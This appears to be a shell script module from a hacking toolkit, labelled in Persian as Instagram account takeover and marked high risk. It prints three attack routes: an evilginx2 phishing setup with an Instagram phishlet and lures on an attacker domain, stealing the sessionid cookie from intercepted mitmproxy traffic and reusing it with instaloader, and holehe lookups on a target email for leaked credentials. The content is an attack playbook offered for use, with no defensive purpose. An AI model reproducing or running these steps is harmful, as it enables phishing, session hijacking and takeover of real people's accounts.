DESC="تصاحب اکانت اینستاگرام"
RISK="HIGH"

termux(){ echo "# evilginx2 روی VPS"; }

kali(){
cat <<'EOF'
# مسیر ۱: فیشینگ
./evilginx2 -p phishlets
phishlets hostname instagram login.yourdomain.com
phishlets enable instagram
lures create instagram

# مسیر ۲: sessionid از ترافیک
# در mitmproxy دنبال هدر Cookie با sessionid بگرد
# سپس:
instaloader --sessionfile=sess --login=<user>

# مسیر ۳: پسورد لو رفته
holehe target@gmail.com
EOF
}
